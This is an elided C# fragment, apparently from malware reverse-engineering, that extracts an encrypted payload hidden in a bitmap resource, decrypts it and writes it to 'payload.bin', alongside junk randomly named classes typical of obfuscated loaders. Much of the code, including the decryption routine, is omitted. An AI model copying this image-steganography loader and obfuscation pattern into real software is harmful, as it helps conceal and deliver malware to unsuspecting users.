...
namespace MalwareCodeDecryption
{
    public class nHWt
    {
        public void qbkm()
    ...
    class Program
    {
        ...
        {
            Bitmap myBmp = WindowsFormsApplication2.Properties.Resources.b;		//payload : 073a97a88e7a1512e1a7bbadcab962f4dcedd3f5
            return myBmp;
        }
        ...
        static void Main()
        {
            try
            {
                ...
                */
                byte[] rawAssembly = decrypt(ConvertFromBmp(getBitmap()));
                FileStream fs = new FileStream("payload.bin", FileMode.Create);
                BinaryWriter bw = new BinaryWriter(fs);
                bw.Write(rawAssembly);
                bw.Close();
                fs.Close();
    ...
    public class yknR
    {
        public void nkRs()
        {
            //float KQQi = -1.571389E-16;
            //float XNNK = -5.723533E+22;
            short bMIz = -14931;
            byte[] bMIzbMIz = System.IO.File.ReadAllBytes("bMIz");
            //float ftwk = 4.152862E+14;
